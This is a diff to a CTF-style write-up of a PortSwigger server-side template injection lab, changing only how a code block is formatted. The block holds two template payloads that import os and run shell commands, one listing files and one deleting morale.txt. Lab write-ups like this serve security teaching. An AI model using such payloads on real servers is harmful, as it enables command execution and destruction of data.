@@ -115,9 +115,9 @@ Since I'm quite familiar with Python, I knew that **we can import a module calle
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031804.png)
 
 **Nice! Let's delete `morale.txt` file:**
-```
-`{% import os %}{{os.system("ls")}}`
-`{% import os %}{{os.system("rm morale.txt")}}`
+```py
+{% import os %}{{os.system("ls")}}
+{% import os %}{{os.system("rm morale.txt")}}
 ```
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031915.png)
